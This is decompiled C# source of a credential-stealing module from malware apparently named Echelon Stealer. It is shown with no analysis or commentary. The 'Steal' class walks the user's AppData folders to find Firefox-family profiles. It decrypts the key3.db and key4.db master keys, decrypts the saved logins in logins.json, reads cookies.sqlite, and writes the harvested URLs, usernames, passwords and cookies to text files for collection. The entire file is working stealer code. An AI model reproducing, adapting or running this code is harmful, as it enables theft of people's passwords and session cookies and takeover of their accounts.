using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Echelon.Global;
using Echelon.Stealer.Browsers.Gecko;
using Echelon.Stealer.Browsers.Helpers.NoiseMe.Drags.App.Models.JSON;

namespace Echelon.Stealer.Browsers.Helpers
{
	// Token: 0x02000035 RID: 53
	internal class Steal
	{
		// Token: 0x060000F2 RID: 242 RVA: 0x0001DC38 File Offset: 0x0001BE38
		public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
		{
			List<string> list = new List<string>();
			if (files != null && files.Length != 0 && level <= maxLevel)
			{
				List<string> result;
				try
				{
					foreach (string path in Directory.GetDirectories(baseDirectory))
					{
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(path);
							FileInfo[] files2 = directoryInfo.GetFiles();
							bool flag = false;
							int num = 0;
							while (num < files2.Length && !flag)
							{
								int num2 = 0;
								while (num2 < files.Length && !flag)
								{
									string a = files[num2];
									FileInfo fileInfo = files2[num];
									if (a == fileInfo.Name)
									{
										flag = true;
										list.Add(fileInfo.FullName);
									}
									num2++;
								}
								num++;
							}
							foreach (string item in Steal.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
							{
								if (!list.Contains(item))
								{
									list.Add(item);
								}
							}
						}
						catch
						{
						}
					}
					result = list;
				}
				catch
				{
					result = list;
				}
				return result;
			}
			return list;
		}

		// Token: 0x060000F3 RID: 243 RVA: 0x0001DD84 File Offset: 0x0001BF84
		public static void Creds(string profile, string browser_name, string profile_name)
		{
			try
			{
				if (File.Exists(Path.Combine(profile, "key3.db")))
				{
					Steal.Lopos(profile, Steal.p3k(Steal.CreateTempCopy(Path.Combine(profile, "key3.db"))), browser_name, profile_name);
				}
				Steal.Lopos(profile, Steal.p4k(Steal.CreateTempCopy(Path.Combine(profile, "key4.db"))), browser_name, profile_name);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x0001DDF4 File Offset: 0x0001BFF4
		public static void Cookies()
		{
			List<string> list = new List<string>();
			list.AddRange(Steal.FindPaths(Steal.LocalAppData, 4, 1, new string[]
			{
				"key3.db",
				"key4.db",
				"cookies.sqlite",
				"logins.json"
			}));
			list.AddRange(Steal.FindPaths(Steal.RoamingAppData, 4, 1, new string[]
			{
				"key3.db",
				"key4.db",
				"cookies.sqlite",
				"logins.json"
			}));
			foreach (string text in list)
			{
				string fullName = new FileInfo(text).Directory.FullName;
				string browser_name = text.Contains(Steal.RoamingAppData) ? Steal.prbn(fullName) : Steal.plbn(fullName);
				string name = Steal.GetName(fullName);
				Steal.CookMhn(fullName, browser_name, name);
				string text2 = "";
				foreach (string str in Steal.Cookies_Gecko)
				{
					text2 += str;
				}
				if (text2 != "")
				{
					File.WriteAllText(Help.Cookies + "\\Cookies_Mozilla.txt", text2, Encoding.Default);
				}
			}
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x0001DF6C File Offset: 0x0001C16C
		public static void Passwords()
		{
			List<string> list = new List<string>();
			list.AddRange(Steal.FindPaths(Steal.LocalAppData, 4, 1, new string[]
			{
				"key3.db",
				"key4.db",
				"cookies.sqlite",
				"logins.json"
			}));
			list.AddRange(Steal.FindPaths(Steal.RoamingAppData, 4, 1, new string[]
			{
				"key3.db",
				"key4.db",
				"cookies.sqlite",
				"logins.json"
			}));
			foreach (string text in list)
			{
				string fullName = new FileInfo(text).Directory.FullName;
				string browser_name = text.Contains(Steal.RoamingAppData) ? Steal.prbn(fullName) : Steal.plbn(fullName);
				string name = Steal.GetName(fullName);
				Steal.Creds(fullName, browser_name, name);
				string text2 = "";
				foreach (string str in Steal.GeckoBrowsers)
				{
					text2 = text2 + str + Environment.NewLine;
				}
				if (text2 != "")
				{
					File.WriteAllText(Help.Passwords + "\\Passwords_Mozilla.txt", text2, Encoding.Default);
				}
			}
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x0001E0EC File Offset: 0x0001C2EC
		private static string GetName(string path)
		{
			try
			{
				string[] array = path.Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				return array[array.Length - 1];
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x0001E130 File Offset: 0x0001C330
		public static string CreateTempCopy(string filePath)
		{
			string text = Steal.CreateTempPath();
			File.Copy(filePath, text, true);
			return text;
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x0001E14C File Offset: 0x0001C34C
		public static string CreateTempPath()
		{
			return Path.Combine(Steal.TempDirectory, "tempDataBase" + DateTime.Now.ToString("O").Replace(':', '_') + Thread.CurrentThread.GetHashCode().ToString() + Thread.CurrentThread.ManagedThreadId.ToString());
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x0001E1AC File Offset: 0x0001C3AC
		public static void CookMhn(string profile, string browser_name, string profile_name)
		{
			try
			{
				CNT cnt = new CNT(Steal.CreateTempCopy(Path.Combine(profile, "cookies.sqlite")));
				cnt.ReadTable("moz_cookies");
				for (int i = 0; i < cnt.RowLength; i++)
				{
					try
					{
						Steal.domains.Add(cnt.ParseValue(i, "host").Trim());
						Steal.Cookies_Gecko.Add(string.Concat(new string[]
						{
							cnt.ParseValue(i, "host").Trim(),
							"\t",
							(cnt.ParseValue(i, "isSecure") == "1").ToString(),
							"\t",
							cnt.ParseValue(i, "path").Trim(),
							"\t",
							(cnt.ParseValue(i, "isSecure") == "1").ToString(),
							"\t",
							cnt.ParseValue(i, "expiry").Trim(),
							"\t",
							cnt.ParseValue(i, "name").Trim(),
							"\t",
							cnt.ParseValue(i, "value"),
							Environment.NewLine
						}));
					}
					catch
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060000FA RID: 250 RVA: 0x0001E340 File Offset: 0x0001C540
		public static void Lopos(string profile, byte[] privateKey, string browser_name, string profile_name)
		{
			try
			{
				string path = Steal.CreateTempCopy(Path.Combine(profile, "logins.json"));
				if (File.Exists(path))
				{
					foreach (object obj in ((IEnumerable)File.ReadAllText(path).FromJSON()["logins"]))
					{
						JsonValue jsonValue = (JsonValue)obj;
						Gecko4 gecko = Gecko1.Create(Convert.FromBase64String(jsonValue["encryptedUsername"].ToString(false)));
						Gecko4 gecko2 = Gecko1.Create(Convert.FromBase64String(jsonValue["encryptedPassword"].ToString(false)));
						string text = Regex.Replace(Gecko6.lTRjlt(privateKey, gecko.Objects[0].Objects[1].Objects[1].ObjectData, gecko.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
						string text2 = Regex.Replace(Gecko6.lTRjlt(privateKey, gecko2.Objects[0].Objects[1].Objects[1].ObjectData, gecko2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
						Steal.credential.Add(string.Concat(new string[]
						{
							"URL : ",
							jsonValue["hostname"],
							Environment.NewLine,
							"Login: ",
							text,
							Environment.NewLine,
							"Password: ",
							text2,
							Environment.NewLine
						}));
						Steal.GeckoBrowsers.Add(string.Concat(new string[]
						{
							"URL : ",
							jsonValue["hostname"],
							Environment.NewLine,
							"Login: ",
							text,
							Environment.NewLine,
							"Password: ",
							text2,
							Environment.NewLine
						}));
						Steal.count++;
					}
					for (int i = 0; i < Steal.credential.Count<string>(); i++)
					{
						Steal.GeckoBrowsers.Add(string.Concat(new string[]
						{
							"Browser : ",
							browser_name,
							Environment.NewLine,
							"Profile : ",
							profile_name,
							Environment.NewLine,
							Steal.credential[i]
						}));
					}
					Steal.credential.Clear();
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060000FB RID: 251 RVA: 0x0001E624 File Offset: 0x0001C824
		private static byte[] p4k(string file)
		{
			byte[] array = new byte[24];
			byte[] result;
			try
			{
				if (File.Exists(file))
				{
					CNT cnt = new CNT(file);
					cnt.ReadTable("metaData");
					string s = cnt.ParseValue(0, "item1");
					string s2 = cnt.ParseValue(0, "item2)");
					Gecko4 gecko = Gecko1.Create(Encoding.Default.GetBytes(s2));
					byte[] objectData = gecko.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
					byte[] objectData2 = gecko.Objects[0].Objects[1].ObjectData;
					Gecko8 gecko2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
					gecko2.method_0();
					Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, objectData2, PaddingMode.None);
					cnt.ReadTable("nssPrivate");
					int rowLength = cnt.RowLength;
					string s3 = string.Empty;
					for (int i = 0; i < rowLength; i++)
					{
						if (cnt.ParseValue(i, "a102") == Encoding.Default.GetString(Steal.Key4MagicNumber))
						{
							s3 = cnt.ParseValue(i, "a11");
							IL_148:
							Gecko4 gecko3 = Gecko1.Create(Encoding.Default.GetBytes(s3));
							objectData = gecko3.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
							objectData2 = gecko3.Objects[0].Objects[1].ObjectData;
							gecko2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
							gecko2.method_0();
							array = Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, objectData2, PaddingMode.PKCS7));
							return array;
						}
					}
					goto IL_148;
				}
				result = array;
			}
			catch (Exception)
			{
				result = array;
			}
			return result;
		}

		// Token: 0x060000FC RID: 252 RVA: 0x0001E84C File Offset: 0x0001CA4C
		private static byte[] p3k(string file)
		{
			byte[] array = new byte[24];
			byte[] result;
			try
			{
				if (!File.Exists(file))
				{
					result = array;
				}
				else
				{
					new DataTable();
					Gecko9 berkeleyDB = new Gecko9(file);
					Gecko7 gecko = new Gecko7(Steal.vbv(berkeleyDB, (string x) => x.Equals("password-check")));
					string hexString = Steal.vbv(berkeleyDB, (string x) => x.Equals("global-salt"));
					Gecko8 gecko2 = new Gecko8(Steal.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), Steal.ConvertHexStringToByteArray(gecko.EntrySalt));
					gecko2.method_0();
					Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, Steal.ConvertHexStringToByteArray(gecko.Passwordcheck), PaddingMode.None);
					Gecko4 gecko3 = Gecko1.Create(Steal.ConvertHexStringToByteArray(Steal.vbv(berkeleyDB, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
					Gecko8 gecko4 = new Gecko8(Steal.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), gecko3.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
					gecko4.method_0();
					Gecko4 gecko5 = Gecko1.Create(Gecko1.Create(Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko4.DataKey, gecko4.DataIV, gecko3.Objects[0].Objects[1].ObjectData, PaddingMode.None))).Objects[0].Objects[2].ObjectData);
					if (gecko5.Objects[0].Objects[3].ObjectData.Length <= 24)
					{
						array = gecko5.Objects[0].Objects[3].ObjectData;
						result = array;
					}
					else
					{
						Array.Copy(gecko5.Objects[0].Objects[3].ObjectData, gecko5.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
						result = array;
					}
				}
			}
			catch (Exception)
			{
				result = array;
			}
			return result;
		}

		// Token: 0x060000FD RID: 253 RVA: 0x0001EAB8 File Offset: 0x0001CCB8
		public static byte[] ConvertHexStringToByteArray(string hexString)
		{
			if (hexString.Length % 2 != 0)
			{
				throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[]
				{
					hexString
				}));
			}
			byte[] array = new byte[hexString.Length / 2];
			for (int i = 0; i < array.Length; i++)
			{
				string s = hexString.Substring(i * 2, 2);
				array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
			}
			return array;
		}

		// Token: 0x060000FE RID: 254 RVA: 0x0001EB2C File Offset: 0x0001CD2C
		private static string vbv(Gecko9 berkeleyDB, Func<string, bool> predicate)
		{
			string text = string.Empty;
			try
			{
				foreach (KeyValuePair<string, string> keyValuePair in berkeleyDB.Keys)
				{
					if (predicate(keyValuePair.Key))
					{
						text = keyValuePair.Value;
					}
				}
			}
			catch (Exception)
			{
			}
			return text.Replace("-", string.Empty);
		}

		// Token: 0x060000FF RID: 255 RVA: 0x0001EBB8 File Offset: 0x0001CDB8
		private static string prbn(string profilesDirectory)
		{
			string text = string.Empty;
			try
			{
				string[] array = profilesDirectory.Split(new string[]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
			}
			catch (Exception)
			{
			}
			return text.Replace(" ", string.Empty);
		}

		// Token: 0x06000100 RID: 256 RVA: 0x0001EC44 File Offset: 0x0001CE44
		private static string plbn(string profilesDirectory)
		{
			string text = string.Empty;
			try
			{
				string[] array = profilesDirectory.Split(new string[]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
			}
			catch (Exception)
			{
			}
			return text.Replace(" ", string.Empty);
		}

		// Token: 0x04000095 RID: 149
		public static int count;

		// Token: 0x04000096 RID: 150
		public static int count_cookies = 0;

		// Token: 0x04000097 RID: 151
		public static List<string> domains = new List<string>();

		// Token: 0x04000098 RID: 152
		public static List<string> Cookies_Gecko = new List<string>();

		// Token: 0x04000099 RID: 153
		public static List<string> passwors = new List<string>();

		// Token: 0x0400009A RID: 154
		public static List<string> credential = new List<string>();

		// Token: 0x0400009B RID: 155
		public static readonly string LocalAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");

		// Token: 0x0400009C RID: 156
		public static readonly string TempDirectory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");

		// Token: 0x0400009D RID: 157
		public static readonly string RoamingAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");

		// Token: 0x0400009E RID: 158
		public static readonly byte[] Key4MagicNumber = new byte[]
		{
			248,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			1
		};

		// Token: 0x0400009F RID: 159
		public static List<string> GeckoBrowsers = new List<string>();
	}
}
